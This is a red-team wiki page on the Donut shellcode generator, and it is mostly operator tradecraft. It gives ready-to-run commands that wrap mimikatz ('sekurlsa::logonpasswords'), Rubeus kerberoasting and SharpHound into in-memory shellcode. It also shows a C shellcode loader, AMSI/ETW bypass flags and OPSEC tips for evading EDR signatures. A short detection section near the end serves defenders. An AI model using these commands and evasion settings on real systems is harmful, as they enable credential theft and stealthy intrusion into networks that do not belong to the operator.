---
title: Donut — in-memory PE/DLL/.NET shellcode generation
slug: donut-shellcode-generation
---

> **TL;DR:** Donut (TheWover) turns any PE, DLL, .NET assembly, VBScript, JScript, XSL, or .NET module into a self-contained, position-independent shellcode payload that loads and executes the original in memory. Standard primitive behind nearly every modern loader and BOF-style execution chain.

## What it is
Donut is a C library + CLI that takes an input artefact and produces shellcode containing:
- A loader stub (assembly)
- Encrypted/compressed payload
- Optional unmanaged hosting metadata (for .NET — CLR + AppDomain bootstrap)
- Parameters: entrypoint, arguments, runtime version

The output shellcode is fully position-independent — call it at any address, it executes the embedded PE/.NET. Replaces classic PE-loader chains like [[reflective-dll-injection]] for many use cases.

## Preconditions / where it applies
- A PE/DLL/.NET/script to wrap
- Loader environment that can execute shellcode in memory (CS Beacon, Sliver, custom syscall loader)
- Optional: encryption key for staged retrieval, decoy data for sandbox evasion

## Tradecraft

**Basic — wrap a .NET tool (e.g., SharpHound):**

```bash
git clone https://github.com/TheWover/donut && cd donut && make
./donut -i SharpHound.exe -o sh.bin \
  -p '--CollectionMethod All --ZipFileName loot.zip' \
  -a 2 -b 3
# -a 2 = AMD64 architecture
# -b 3 = AMSI + WLDP + ETW bypass enabled
# -p   = command-line passed to assembly's Main()
```

`sh.bin` is now ~700 KB of shellcode containing SharpHound and runtime bootstrap. Feed to your loader:

```c
// Loader pattern — VirtualAlloc + memcpy + jump
void *exec = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(exec, shellcode, len);
((void(*)())exec)();
```

Or via [[bof-cobalt-strike-development]] inline-execute / `execute-assembly` replacement (CS sleep-mask compatible).

**Donut flags worth memorising:**

```
-a <arch>           1=x86, 2=amd64, 3=both
-b <bypass>         1=skip, 2=abort on fail, 3=continue, 4=disable everything
-z <compress>       1=none, 2=aPLib, 3=LZNT1, 4=Xpress, 5=Xpress Huffman
-r <runtime>        .NET version (v4.0.30319 default)
-e <entropy>        1=none, 2=use random key, 3=random key + random IV
-f <format>         1=binary, 2=base64, 3=C, 4=Ruby, 5=Python, 6=PowerShell, 7=C#, 8=Hex
-t <thread>         Run in new thread (avoids loader-blocking calls)
-x <exit>           1=exit thread, 2=exit process — use 1 for in-loader execution
-w                  Set Mscoree.dll to load .NET into separate AppDomain
-y <fork>           Fork to new process before execution (decouples from loader)
```

**Encrypted output with random key per build:**

```bash
./donut -i Rubeus.exe -o r.bin -p 'kerberoast /nowrap' -a 2 -b 3 -e 3 -z 2
# -e 3 = random AES key+IV, embedded in shellcode header
# -z 2 = aPLib compression (smallest output)
```

**Wrap unmanaged PE (e.g., mimikatz):**

```bash
./donut -i mimikatz.exe -o mk.bin -p '"sekurlsa::logonpasswords" exit' -a 2 -b 3 -t 1
# -t 1 ensures mimikatz I/O doesn't block loader
```

**Wrap a DLL with specific export:**

```bash
./donut -i payload.dll -o p.bin -m 'RunPayload' -a 2 -b 3
# -m specifies the export function name
```

**Wrap inline JScript / XSL / VBS (squiblydoo-style without disk hit):**

```bash
./donut -i exec.js -o j.bin -a 2 -b 3
# JScript runs via embedded WSH host inside shellcode
```

**Donut Python module — generate on the fly inside C2:**

```python
import donut
payload = donut.create(
    file='SharpHound.exe',
    arch=2, bypass=3,
    parameters='--CollectionMethod DCOnly',
    fork=True,
    compress=2)
```

CS aggressor / Sliver / Mythic plugins all wrap this. Operator never touches disk on the team server either.

**OPSEC tuning:**
- Increase `-z 5` (Xpress Huffman) to reduce signature entropy compared to aPLib
- `-e 3` randomises the AES key — different shellcode each build, no static-hash IOC
- AMSI/ETW bypass (`-b 3,4`) patches in memory; some EDRs detect the patch — use `-b 1` (skip) when the loader already handles bypasses
- Embedded .NET CLR string `mscoree.dll` survives encryption — defenders YARA-hunt for it inside encrypted-looking buffers

**Pair with sleep-mask loaders** ([[bof-cobalt-strike-development]], custom syscall loaders) so the Donut payload is encrypted in memory between executions.

## Detection and defence
- Defender 2024+ flags Donut stub patterns even encrypted; signature on the loader assembly itself rather than the payload
- AMSI bypass via patching `AmsiScanBuffer` produces in-memory hooks visible to PSP scans
- ETW Userland patch leaves writable `EtwEventWrite` — Sigma rule per [[etw-bypass]]
- Process behavior: Donut-wrapped SharpHound generates the same LDAP query pattern → detect at the network/AD layer
- Inline-execute-assembly inside Beacon process spawns no new process — hunt via .NET CLR load in unusual process (`Microsoft-Windows-DotNETRuntime` ETW provider)

## OPSEC pitfalls
- Stale `mscoree.dll` strings inside the encrypted buffer leak through some entropy scanners; consider double-encryption layer in loader
- `set spawnto` mismatch with Donut's `-f 1` raw blob causes injection failures — use the same arch
- Running .NET payloads inside a 32-bit Beacon while wrapping x64 with `-a 2` produces silent failures; check `-a 3` (both) when uncertain

## References
- [Donut repo](https://github.com/TheWover/donut)
- [TheWover — Donut release post](https://thewover.github.io/Introducing-Donut/)
- [Donut Python wrapper](https://pypi.org/project/donut-shellcode/)
- [SpecterOps — analysing Donut](https://posts.specterops.io/)

See also: [[bof-cobalt-strike-development]], [[reflective-dll-injection]], [[process-injection-techniques]], [[cobalt-strike-malleable-c2-profiles]], [[sliver-c2-deep]], [[havoc-c2-deep]], [[mythic-framework-deep]], [[amsi-bypass]], [[etw-bypass]], [[syscall-direct-and-indirect]]
